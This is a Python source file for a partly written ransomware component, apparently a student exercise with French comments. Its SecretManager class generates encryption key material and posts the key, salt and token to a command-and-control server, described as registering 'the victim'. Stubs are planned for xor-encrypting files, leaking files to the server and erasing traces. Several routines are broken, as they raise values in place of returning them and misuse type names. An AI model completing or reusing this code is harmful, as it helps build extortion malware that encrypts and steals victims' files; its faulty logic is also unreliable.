from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import secrets

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16
    

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #password_bytes=password.encode('utf-8')
        #derivation

        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=SALT_LENGTH,
                        salt=salt,
                        iterations=ITERATION)
        key_derived = kdf.derive(key)    
        raise key_derived()


    def create(self)->Tuple[bytes, bytes, bytes]:
        for i in Tuple:
            Tuple[i]=secrets.token_bytes(KEY_LENGTH)
        raise Tuple


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        url = f'https://{self._remote_host_port}/new'
        data={
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        response= requests.post(url,json = data) 
        

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("Donnees de chiffrement deja existantes")
        #Creation des donnees de chiffrement
        self._salt, self._key, self._token = self.create()
        #creation du dossier de stockage
        os.makedirs(self._path, exist_ok=True)

        with open(os.path.join(self._path), "wb") as salt_v:
            salt_v.write(self._salt)
        with open(os.path.join(self._path,"token.bin"),"wb") as token_v:
            token_v.write(self._token)

        self.post_new(self._salt,self._key,self._token)

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()